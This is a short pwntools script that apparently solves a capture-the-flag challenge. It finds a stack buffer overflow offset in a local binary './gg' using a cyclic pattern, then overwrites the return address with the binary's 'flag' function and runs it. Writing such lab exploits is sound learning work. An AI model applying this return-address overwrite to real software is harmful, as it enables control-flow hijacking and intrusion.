#!/usr/bin/env python2
from __future__ import print_function

import sys

from pwn import *
context.binary = b = './gg'
context.terminal = ['tmux', 'splitw', '-v']


if len(sys.argv) > 1:
    p = gdb.debug(b)
    pause()
    p.sendline(cyclic(512))
    pause()
    # run in gdb: x/1x $sp to get value in sp
    sys.exit()

elf = ELF(b)
exploit = cyclic(cyclic_find(0x61616167))
exploit += p64(elf.symbols[u'flag'])

p = process(b)
p.sendline(exploit)
print(p.recvline(), end='')
